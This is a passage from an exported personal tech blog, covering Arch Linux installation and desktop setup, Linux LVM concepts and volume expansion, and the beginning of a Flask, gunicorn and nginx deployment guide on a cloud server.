<p>Then <code>:wq</code> save and quit.</p>
<p>Generate the locales by running:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">locale-gen</span><br></pre></td></tr></table></figure>

<p>Config locale file:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/locale.conf</span><br></pre></td></tr></table></figure>

<p>Add the following line to the first line of this file:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">LANG=en_US.UTF-8</span><br></pre></td></tr></table></figure>

<p><code>:wq</code> . Fine.</p>
<h3 id="Network-configuration"><a href="#Network-configuration" class="headerlink" title="Network configuration"></a>Network configuration</h3><p>Create the hostname file:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/hostname</span><br></pre></td></tr></table></figure>

<p>Config your hosts:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>

<p>Add the following contents to the end of this file:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1	localhost</span><br><span class="line">::1		localhost</span><br><span class="line">127.0.1.1	myhostname.localdomain	myhostname</span><br></pre></td></tr></table></figure>

<h3 id="Set-root-password"><a href="#Set-root-password" class="headerlink" title="Set root password"></a>Set root password</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">passwd</span><br></pre></td></tr></table></figure>

<h3 id="Install-Intel-ucode-if-you-have-a-Intel-CPU"><a href="#Install-Intel-ucode-if-you-have-a-Intel-CPU" class="headerlink" title="Install Intel-ucode (if you have a Intel CPU)"></a>Install Intel-ucode (if you have a Intel CPU)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S intel-ucode</span><br></pre></td></tr></table></figure>

<h3 id="Install-BootLoader"><a href="#Install-BootLoader" class="headerlink" title="Install BootLoader"></a>Install BootLoader</h3><p>Caution! This blog is only for EFI/GPT boot mode! If you are in BIOS/MBR mode, please see <code>Reference 2</code> at the end.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S os-prober ntfs-3g</span><br><span class="line">pacman -S grub efibootmgr</span><br><span class="line">grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=grub</span><br><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure>

<p>If there is multi systems on your device, it is recommended to check whether each system’s entry is well generated.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure>

<p>Check if it is all right.</p>
<h3 id="Reboot-and-enjoy-archlinux"><a href="#Reboot-and-enjoy-archlinux" class="headerlink" title="Reboot and enjoy archlinux"></a>Reboot and enjoy archlinux</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exit</span></span><br><span class="line">umount /mnt/boot</span><br><span class="line">umount /mnt</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>

<p>Pull out your U-disk. Login as root, enter your password.</p>
<p>If you can see the command line, congratulations, you have installed Archlinux successfully! OHHHHHHH!</p>
<p>There is still many things to do after that, I will put some guide for them on my next blog.</p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol>
<li><p><a href="https://wiki.archlinux.org/index.php/Installation_guide" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/Installation_guide</a></p>
</li>
<li><p><a href="https://www.viseator.com/2017/05/17/arch_install/" target="_blank" rel="noopener">https://www.viseator.com/2017/05/17/arch_install/</a></p>
</li>
</ol>
]]></content>
      <categories>
        <category>系统</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Re:1 Config Archlinux From Scratch</title>
    <url>/2020/10/17/Re-1-Config-Archlinux-From-Scratch/</url>
    <content><![CDATA[<p>上一篇文章介绍了Archlinux的安装流程。但是，现在连个图形界面也没有，一堆效率导向的包都没有装上，这还玩个🔨啊。这篇来看看如何把Arch配置成用起来超爽的工具。因为到这里还没有装好中文输入法，所以和上一篇一样是英文的。英语水平不高，有错误的话，万分抱歉。<del>下次重装系统自己能看懂就行</del></p>
<a id="more"></a>

<h2 id="Create-a-new-user"><a href="#Create-a-new-user" class="headerlink" title="Create a new user"></a>Create a new user</h2><p>It is unsafe to use root for daily use. It is better to create a ordinary user.</p>
<p>Let’s create a new user named muted.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">useradd -m -G wheel muted</span><br></pre></td></tr></table></figure>

<p><code>-m</code> stands for creating a new folder whose name is the same as your new user. You can use <code>~</code> to access it easily. <code>-G wheel</code> stands for adding the new user “muted” to a group named “wheel”.</p>
<p>Set a password for this user:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">passwd muted</span><br></pre></td></tr></table></figure>

<h2 id="Config-sudo"><a href="#Config-sudo" class="headerlink" title="Config sudo"></a>Config sudo</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ln -s /usr/bin/vim /usr/bin/vi</span><br><span class="line">visudo</span><br></pre></td></tr></table></figure>

<p>Uncomment <code># %wheel ALL=(ALL)ALL</code>, then reboot. This time your new user is able to use <code>sudo</code> command.</p>
<h2 id="Graphical-interface-installation"><a href="#Graphical-interface-installation" class="headerlink" title="Graphical interface installation"></a>Graphical interface installation</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dhcpcd  <span class="comment"># Connet to the Internet</span></span><br><span class="line">sudo pacman -S xf86-video-intel  <span class="comment"># If your GPU is from Intel</span></span><br></pre></td></tr></table></figure>

<p>See also: <a href="https://wiki.archlinux.org/index.php/Xorg#Driver_installation" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/Xorg#Driver_installation</a></p>
<p>Now install Xorg and some necessary packages:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S xorg xorg-server plasma dolphin kate kdialog konsole fsearch dragon ffmpegthumbs sddm sddm-kcm</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> sddm</span><br></pre></td></tr></table></figure>

<p><code>kde-meta-kdeadmin</code> <code>kde-meta-kdeutils</code> <code>kde-meta-kdegraphics</code> have been removed because of obsoleteness.</p>
<h2 id="Config-your-Internet"><a href="#Config-your-Internet" class="headerlink" title="Config your Internet"></a>Config your Internet</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">disable</span> netctl</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> NetworkManager  <span class="comment"># Draw attention on UPPER and lower case</span></span><br><span class="line">sudo pacman -S network-manager-applet</span><br></pre></td></tr></table></figure>

<h2 id="Use-pacman-mirror"><a href="#Use-pacman-mirror" class="headerlink" title="Use pacman mirror"></a>Use pacman mirror</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/pacman.d/mirrorlist</span><br></pre></td></tr></table></figure>

<p>Copy the mirrors you wants to use and paste them to the beginning of this file. One of the commonly used mirrors is <code>https://mirrors.tuna.tsinghua.edu.cn</code>.</p>
<p>I chose <code>https://linux.xidian.edu.cn/mirrors/archlinux/$repo/os/$arch</code> (Only available under the campus network environment).</p>
<h2 id="Use-archlinuxcn-repository"><a href="#Use-archlinuxcn-repository" class="headerlink" title="Use archlinuxcn repository"></a>Use archlinuxcn repository</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/pacman.conf</span><br></pre></td></tr></table></figure>

<p>At the end of file add:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[archlinuxcn]</span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br></pre></td></tr></table></figure>

<p>If you are a ‘Xidianer’ too, you can also:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Server = https://linux.xidian.edu.cn/mirrors/archlinuxcn/<span class="variable">$arch</span></span><br></pre></td></tr></table></figure>

<p>Then:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -Syy</span><br><span class="line">sudo pacman -Syu</span><br><span class="line">sudo pacman -S archlinuxcn-keyring</span><br></pre></td></tr></table></figure>

<h2 id="Use-AUR-repository-with-yay"><a href="#Use-AUR-repository-with-yay" class="headerlink" title="Use AUR repository with yay"></a>Use AUR repository with yay</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S yay</span><br><span class="line">yay -Syu --devel --combinedupgrade --save</span><br></pre></td></tr></table></figure>

<p>Then change current <code>aururl</code> to <code>https://aur.tuna.tsinghua.edu.cn</code>.</p>
<h2 id="Use-fish-shell-as-your-default-shell"><a href="#Use-fish-shell-as-your-default-shell" class="headerlink" title="Use fish shell as  your default shell"></a>Use fish shell as  your default shell</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S fish</span><br></pre></td></tr></table></figure>


<p>Set fish the default shell on Konsole: <code>Konsole -&gt; Settings -&gt; Edit Current Profile</code>, choose /bin/fish as default command, Then restart Konsole.</p>
<p>Use fish as default user shell:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo chsh -s /usr/bin/fish root</span><br><span class="line">sudo chsh -s /usr/bin/fish [username]</span><br></pre></td></tr></table></figure>

<p>Set greeting words:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> fish_greeting <span class="string">'Your Greeting Words'</span></span><br></pre></td></tr></table></figure>

<p>Config fish shell:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fish_config</span><br></pre></td></tr></table></figure>

<p>I recommend to set some abbreviations, for example:</p>
<p><code>pc</code> is short for <code>proxychains</code></p>
<p><code>pmc</code> is short for <code>sudo vim /etc/pacman.d/mirrorlist</code></p>
<p><code>pmi</code> is short for <code>sudo pacman -S</code></p>
<p><code>pms</code> is short for <code>sudo pacman -Ss</code></p>
<p><code>pmu</code> is short for <code>sudo pacman -Syyu</code></p>
<h2 id="Change-hosts-Github"><a href="#Change-hosts-Github" class="headerlink" title="Change hosts (Github)"></a>Change hosts (Github)</h2><p>Seems not very useful for me but… just record it here in case that some day I need it.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S dnsutils</span><br></pre></td></tr></table></figure>


<p>Use <code>dig</code> or <code>nslookup</code> command to build a hosts file yourself.</p>
<h2 id="Bypass-GFW"><a href="#Bypass-GFW" class="headerlink" title="Bypass GFW"></a>Bypass GFW</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S v2ray qv2ray proxychains-ng</span><br></pre></td></tr></table></figure>

<p>More? …sorry but I won’t tell you more🤪</p>
<p><strong>Caution! : Set your system time correctly first, or you can never success.</strong></p>
<p>If you want some rules, look at here: <a href="https://github.com/Loyalsoldier/v2ray-rules-dat" target="_blank" rel="noopener">https://github.com/Loyalsoldier/v2ray-rules-dat</a>, just put geosite and geoip into <code>/usr/share/v2ray/</code>. Easy!</p>
<h2 id="Fonts-config"><a href="#Fonts-config" class="headerlink" title="Fonts config"></a>Fonts config</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S noto-fonts noto-fonts-cjk noto-fonts-emoji ttf-sarasa-gothic nerd-fonts-jetbrains-mono wqy-microhei wqy-zenhei</span><br></pre></td></tr></table></figure>


<p>Download the config file at <a href="https://bitbucket.org/szclsya/dotfiles/src/master/fontconfig/fonts.conf" target="_blank" rel="noopener">https://bitbucket.org/szclsya/dotfiles/src/master/fontconfig/fonts.conf</a>, put it into <code>~/.config/fontconfig/fonts.conf</code>, log out and log in, then it works.</p>
<h2 id="Install-Google-chrome"><a href="#Install-Google-chrome" class="headerlink" title="Install Google-chrome"></a>Install Google-chrome</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S google-chrome</span><br></pre></td></tr></table></figure>

<p>Caution: the bin file named <code>google-chrome-stable</code>, so if you want to start it use command line, use:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">google-chrome-stable</span><br></pre></td></tr></table></figure>

<h2 id="Chinese-input"><a href="#Chinese-input" class="headerlink" title="Chinese input"></a>Chinese input</h2><p>I chose Rime(fcitx5) as my Chinese input scheme instead of sogou pinyin because the latter has some strange conflict with Jetbrains IDEs. <del>🔪🔪🔪Fuck Sogou</del></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S fcitx5-im fcitx5-configtool</span><br><span class="line">sudo pacman -S fcitx5-chinese-addons fcitx5-gtk fcitx5-qt fcitx5-pinyin-zhwiki kcm-fcitx5</span><br><span class="line">sudo pacman -S fcitx5-rime</span><br></pre></td></tr></table></figure>

<p><code>fcitx-configtool -&gt; add rime</code></p>
<p>Now let’s config it:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.xprofile</span><br></pre></td></tr></table></figure>

<p>Then add:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> GTK_IM_MODULE=fcitx</span><br><span class="line"><span class="built_in">export</span> QT_IM_MODULE-fcitx</span><br><span class="line"><span class="built_in">export</span> XMODIFIERS=<span class="string">"@im=fcitx"</span></span><br><span class="line">fcitx5 &amp;</span><br></pre></td></tr></table></figure>

<p>Log out then Log in. It works. But… It’s not BEEEAAAUTIFUL enough! </p>
<p><strong>RXnb! Let’s use RX’s skin for fcitx5 input method!</strong><br><a href="https://github.com/Reverier-Xu/RxWe10-Fcitx5" target="_blank" rel="noopener">https://github.com/Reverier-Xu/RxWe10-Fcitx5</a><br>Put those theme file to <code>/usr/share/fcitx5/themes/</code>, and set <code>~/.config/fcitx5/conf/classicui.conf</code>:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 垂直候选列表</span></span><br><span class="line">Vertical Candidate List=False</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按屏幕 DPI 使用</span></span><br><span class="line">PerScreenDPI=True</span><br><span class="line"></span><br><span class="line"><span class="comment"># Font (设置成你喜欢的字体)</span></span><br><span class="line">Font=<span class="string">"字体字体字体字体写在这里"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主题</span></span><br><span class="line">Theme=RxWe10-light</span><br></pre></td></tr></table></figure>

<p>Or you can use some famous theme such as:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S fcitx5-material-color</span><br></pre></td></tr></table></figure>

<p>See Also: <a href="https://github.com/hosxy/Fcitx5-Material-Color" target="_blank" rel="noopener">https://github.com/hosxy/Fcitx5-Material-Color</a></p>
<p>If you want to use simplified Chinese, create a new file named <code>default.custom.yaml</code> under <code>$HOME/.local/share/fcitx5/rime/</code> . With <code>default.yaml</code> in <code>./build</code> folder as reference, you can customize your settings freely. Also, you can turn to <code>/usr/share/rime-data/</code> to do those things.</p>
<h2 id="Install-Jetbrains-IDEs"><a href="#Install-Jetbrains-IDEs" class="headerlink" title="Install Jetbrains IDEs"></a>Install Jetbrains IDEs</h2><p>Developers necessity. Use <code>pacman</code> or <code>yay</code> .</p>
<h2 id="Install-Tencent-shits"><a href="#Install-Tencent-shits" class="headerlink" title="Install Tencent shits"></a>Install Tencent shits</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/pacman.conf</span><br></pre></td></tr></table></figure>

<p>To use deepin-wine I have to enable multilib since my Archlinux is x64 version (?)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -Sy deepin.com.qq.office</span><br></pre></td></tr></table></figure>

<p>Now TIM is installed. But we cannot run it now since it is designed to be compatible with GTK style desktops. So we:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S gnome-settings-daemon</span><br></pre></td></tr></table></figure>

<p><code>System Settings -&gt; Start up and shut down -&gt; Autostart -&gt; Add Script -&gt; /usr/lib/gsd-xsettings</code></p>
<p>Reboot. Now TIM is available. Though it is not easy to use as it is on Windows, we HAVE a TIM on Arch at least. </p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol>
<li><a href="https://www.viseator.com/2017/05/19/arch_setup/" target="_blank" rel="noopener">https://www.viseator.com/2017/05/19/arch_setup/</a></li>
<li><a href="https://www.wootec.top/2019/11/02/%E5%A6%82%E4%BD%95%E5%9C%A8Linux%E4%B8%8A%E4%BC%98%E9%9B%85%E7%9A%84%E5%A0%95%E8%90%BD/" target="_blank" rel="noopener">https://www.wootec.top/2019/11/02/%E5%A6%82%E4%BD%95%E5%9C%A8Linux%E4%B8%8A%E4%BC%98%E9%9B%85%E7%9A%84%E5%A0%95%E8%90%BD/</a></li>
<li><a href="https://www.wootec.top/2019/11/15/%E5%A6%82%E4%BD%95%E5%9C%A8Linux%E4%B8%8A%E4%BC%98%E9%9B%85%E7%9A%84%E5%A0%95%E8%90%BD-2/" target="_blank" rel="noopener">https://www.wootec.top/2019/11/15/%E5%A6%82%E4%BD%95%E5%9C%A8Linux%E4%B8%8A%E4%BC%98%E9%9B%85%E7%9A%84%E5%A0%95%E8%90%BD-2/</a></li>
<li><a href="https://rocka.me/article/arch-linux-kde-plasma-install-and-config" target="_blank" rel="noopener">https://rocka.me/article/arch-linux-kde-plasma-install-and-config</a></li>
</ol>
]]></content>
      <categories>
        <category>系统</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux LVM 简记</title>
    <url>/2021/10/30/Linux-LVM-%E7%AE%80%E8%AE%B0/</url>
    <content><![CDATA[<p>LVM（Logical Volume Manager），即逻辑卷管理器，对于硬盘管理来说是十分好用的，尤其是对于大容量存储设备的管理是有相当大的好处的。之前一直对这部分一知半解学了就忘，还是得记录一下。</p>
<a id="more"></a>

<h2 id="驱动器、分区和卷"><a href="#驱动器、分区和卷" class="headerlink" title="驱动器、分区和卷"></a>驱动器、分区和卷</h2><p><strong>驱动器（Drive）</strong> 一般指的是用于存储的物理介质，如 HDD、SSD、U 盘等，在 linux 中表现为 <code>/dev</code> 目录下的各个设备节点，如 IDE 设备在 linux 中显示为 <code>/dev/hdX</code> ，其中 <code>X</code> 为字母，代表系统检测到设备的顺序，如第一块 IDE 设备即为 <code>/dev/hda</code> ，以此类推。类似地，SCSI 设备，现在也被广泛应用于各类 PATA 和 SATA 盘，在 linux 中显示为 <code>/dev/sdX</code> 。</p>
<p>驱动器可以被分为多个<strong>分区（Partition）</strong>，因此当我们谈论分区时，我们谈论的也是偏向物理层面的内容。每个分区在 linux 中的显示由其物理驱动器和编号组成，例如 <code>/dev/sda</code> 可能会有 <code>/dev/sda1</code>， <code>/dev/sda2</code> 等多个分区。分成分区后每个分区即可分别挂载到挂载点完成存储工作。也有一些类 Unix 系统采用诸如 <code>/dev/adX</code> （其中 <code>X</code> 为任意数字）的形式表示驱动器 X，并采用 <code>/dev/adXpY</code> （其中 <code>X</code> 和 <code>Y</code> 均为任意数字）来表示驱动器 X 的第 Y 个分区。不过总体上来看大同小异。</p>
<p><strong>卷（Volume）</strong> 一般是在 LVM 管理中提到的概念。其中 <strong>物理卷（Physical Volume）</strong> 指的是整个驱动器或其中的某个分区，很明显是偏向物理层面的概念。而对比物理卷的概念，<strong>逻辑卷（Logical Volume）</strong> 则更偏向于逻辑层面。在 LVM 管理中，一个或多个物理卷可以被映射到一个或多个逻辑卷中，而上层应用与逻辑卷进行交互，从而对相应的物理卷中的存储单元产生读写等操作，极大地方便了存储空间的管理。</p>
<h2 id="传统磁盘管理的局限性"><a href="#传统磁盘管理的局限性" class="headerlink" title="传统磁盘管理的局限性"></a>传统磁盘管理的局限性</h2><p>在传统的磁盘管理中，磁盘被分为多个分区，并直接挂载到挂载点进行使用。每个分区的大小都是固定的，除非对硬盘进行重新分区，否则对分区的大小进行变更是很困难的，尤其是在生产环境中，如果因为这类原因导致服务 down 掉是绝对不能容忍的。LVM 是解决这一问题非常好的方式。</p>
<p>《程序员的自我修养》中引用过一段来源无从考证的名言：</p>
<blockquote>
<p>计算机科学领域的任何问题都可以通过增加一个间接的中间层来解决。</p>
</blockquote>
<p>感觉 LVM 就是在存储空间管理领域中对这句话的典型应用嘛…… 在传统的磁盘管理模式中，上层应用直接与物理存储介质交互，造成管理的不便和扩容的困难，既然如此，LVM 的方式就是在中间加入了一层中间层，将物理层面的存储介质和逻辑层面的存储设备隔离开，使得上层应用直接访问 LVM 的逻辑卷，并将要访问的逻辑卷的存储空间映射到物理存储介质上，从而巧妙地将逻辑层面上更换介质或扩充介质的问题与物理层面的分离，从而规避了物理存储管理的诸多问题。</p>
<h2 id="LVM-的原理"><a href="#LVM-的原理" class="headerlink" title="LVM 的原理"></a>LVM 的原理</h2><p><img src="/2021/10/30/Linux-LVM-%E7%AE%80%E8%AE%B0/lvm-structure.png" alt="LVM 的工作原理"></p>
<p>LVM 的工作原理中有以下几个重要的概念：</p>
<ol>
<li>物理卷（Physical Volume）</li>
<li>卷组（Volume Group）</li>
<li>逻辑卷（Logical Group）</li>
</ol>
<p>这几个概念是伴随着 LVM 的原理产生的。LVM 对物理存储空间进行逻辑管理的过程有点像多线程与多核中的多对多关系，其具体过程如下：</p>
<p><img src="/2021/10/30/Linux-LVM-%E7%AE%80%E8%AE%B0/lvm-process.png" alt="LVM 的形成过程"></p>
<ol>
<li><p>物理存储设备经过格式化形成物理卷。</p>
<p>在这一步中物理存储设备将被分割成多个称为 PE（Physical Extent）的小单元，一般每个 PE 的大小为 4M，物理存储设备经过格式化分割后形成物理卷。</p>
</li>
<li><p>创建卷组 VG（Volume Group）。</p>
<p>在这一步中由上一步形成的物理卷组合形成卷组，以对不同卷组可以访问的物理介质范围进行限定。卷组可以从物理卷中的 PE 中任意挑选出若干块而形成。</p>
</li>
<li><p>创建逻辑卷 LV（Logical Volume）。</p>
<p>在这一步中我们从创建的 VG 中选取出若干 PE 组成一个 LV，在逻辑上，我们产生的 LV 和传统存储方法中的分区相类似，在经过挂载后都直接能和上层进行交互。不同之处是，我们的 LV 现在由多块 PE 构成，想要完成扩容等功能只需要对这些 PE 进行操作，而避免了物理设备层面上的诸多麻烦。</p>
</li>
<li><p>将创建好的 LV 进行格式化后挂载使用。</p>
</li>
</ol>
<h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><p>下面是对使用 LVM 的 Ubuntu 20.04.3 虚拟机进行扩容的实操步骤，在 VMWare 中进行扩容的操作在此略过。</p>
<ol>
<li><p>首先对系统的物理存储设备进行查看。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">df -h  <span class="comment"># 查看已挂载的卷</span></span><br><span class="line">fdisk -l  <span class="comment"># 查看物理存储设备情况</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发现报错 “GPT PMBR size mismatch (62914559 != 83886079) will be corrected by write.”</span></span><br><span class="line">parted -l  <span class="comment"># 修复分区表</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/30/Linux-LVM-%E7%AE%80%E8%AE%B0/%E6%9F%A5%E7%9C%8B%E5%B7%B2%E6%8C%82%E8%BD%BD%E7%9A%84%E5%8D%B7.jpg" alt="查看已挂载的卷"><br><img src="/2021/10/30/Linux-LVM-%E7%AE%80%E8%AE%B0/%E6%9F%A5%E7%9C%8B%E7%89%A9%E7%90%86%E5%AD%98%E5%82%A8%E8%AE%BE%E5%A4%87%E6%83%85%E5%86%B5.jpg" alt="查看物理存储设备情况"></p>
</li>
<li><p>使用 parted 给物理卷追加容量</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">parted /dev/sda  <span class="comment"># 对物理存储设备进行操作</span></span><br><span class="line"></span><br><span class="line">unit s  <span class="comment"># 设置 Size 单位，方便追加输入</span></span><br><span class="line">p free  <span class="comment"># 查看剩余容量详情</span></span><br><span class="line">resizepart 3 100%  <span class="comment"># 将所有空闲空间都分配给 sda3</span></span><br><span class="line"><span class="comment"># resizepart 3   也可以此命令之后输入结束位置</span></span><br><span class="line">q  <span class="comment"># 退出</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/30/Linux-LVM-%E7%AE%80%E8%AE%B0/%E7%89%A9%E7%90%86%E5%8D%B7%E8%BF%BD%E5%8A%A0%E5%AE%B9%E9%87%8F.jpg" alt="物理卷追加容量"></p>
</li>
<li><p>更新 LVM 中的物理卷</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pvresize /dev/sda3  <span class="comment"># 更新pv物理卷</span></span><br><span class="line">pvdisplay  <span class="comment"># 查看状态</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/30/Linux-LVM-%E7%AE%80%E8%AE%B0/%E6%9B%B4%E6%96%B0%E7%89%A9%E7%90%86%E5%8D%B7.jpg" alt="更新物理卷"></p>
</li>
<li><p>LVM 逻辑卷扩容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lvdisplay  <span class="comment"># 查看lv情况</span></span><br><span class="line">lvextend -l +100%FREE /dev/ubuntu-vg/ubuntu-lv  <span class="comment"># 逻辑卷扩容</span></span><br><span class="line">resize2fs /dev/ubuntu-vg/ubuntu-lv  <span class="comment"># 刷新逻辑卷</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/30/Linux-LVM-%E7%AE%80%E8%AE%B0/%E9%80%BB%E8%BE%91%E5%8D%B7%E6%89%A9%E5%AE%B9.jpg" alt="逻辑卷扩容"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>LVM</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu+gunicorn+nginx在ECS上搭建Flask环境</title>
    <url>/2020/10/01/gunicorn+nginx%E5%9C%A8ECS%E4%B8%8A%E6%90%AD%E5%BB%BAFlask%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<p>网络上能搜索到的资源基本都有些疏漏的地方，把自己的配置过程Po上来做个参考防止重复踩坑。</p>
<a id="more"></a>

<p><a href="https://zhuanlan.zhihu.com/p/22126999" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/22126999</a> 这篇专栏写得还不错，参考了其中的一些内容做了自己的配置，不过这篇里也有一些没写清楚的超级坑点，坑了我好久，我在这里补充一些内容来防止重复踩坑了。</p>
<p>相关版本清单如下：</p>
<blockquote>
<p>系统： Ubuntu 16.04 64位</p>
<p>WSGI： Gunicorn</p>
<p>进程监控： Supervisor</p>
<p>服务器软件：nginx</p>
<p>Python版本： python3.5.2</p>
</blockquote>
<h1 id="云服务器相关"><a href="#云服务器相关" class="headerlink" title="云服务器相关"></a>云服务器相关</h1><p>笔者用的是阿里云ECS的学生机，当然你用其它家的产品也大同小异啦。</p>
<p>ssh连接：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh root@xxx.xxx.xxx.xxx</span><br></pre></td></tr></table></figure>

<p>建立普通用户账号：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">useradd www -d /home/www -m</span><br><span class="line">passwd www</span><br></pre></td></tr></table></figure>

<h1 id="安装相关支持"><a href="#安装相关支持" class="headerlink" title="安装相关支持"></a>安装相关支持</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install flask</span><br><span class="line">apt install python-pip</span><br><span class="line">pip install virtualenv</span><br></pre></td></tr></table></figure>

<p>如果安装virtualenv遇到以下报错：</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">IOError: [Errno <span class="number">2</span>] <span class="keyword">No</span> such <span class="keyword">file</span> <span class="keyword">or</span> directory: <span class="string">'/tmp/pip-kYFqUa-build/setup.py'</span></span><br></pre></td></tr></table></figure>

<p>尝试：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install --upgrade pip</span><br></pre></td></tr></table></figure>

<h1 id="页面配置"><a href="#页面配置" class="headerlink" title="页面配置"></a>页面配置</h1><p>先保留root终端，新开一个终端并使用刚才新建的用户登录服务器。</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ssh</span> www<span class="variable">@xxx</span>.xxx.xxx.xxx</span><br></pre></td></tr></table></figure>

<p>创建网站根目录：</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">mkdir</span> blog</span><br></pre></td></tr></table></figure>

<p>创建了工程的文件夹，这里用blog来代替，根据实际情况要换成其它的命名。</p>
<p>下面创建虚拟环境：</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">cd</span> <span class="keyword">blog</span></span><br><span class="line"><span class="keyword">virtualenv </span>-p /usr/<span class="keyword">bin/python3 </span>venv</span><br></pre></td></tr></table></figure>

<p>使用SFTP可以上传本地的工程文件到blog文件夹。建议使用www用户。</p>
<p>pip包生成requiements.txt:</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">freeze</span> &gt; requirements.txt</span><br></pre></td></tr></table></figure>

<h1 id="Gunicorn配置"><a href="#Gunicorn配置" class="headerlink" title="Gunicorn配置"></a>Gunicorn配置</h1><p>下面配置Gunicorn：</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">source</span> <span class="string">venv/bin/activate</span></span><br><span class="line"><span class="attr">pip</span> <span class="string">install gunicorn</span></span><br><span class="line"><span class="attr">cd</span> <span class="string">/home/www/blog</span></span><br><span class="line"><span class="attr">vim</span> <span class="string">gunicorn.conf</span></span><br></pre></td></tr></table></figure>

<p>之后用vim写入：</p>
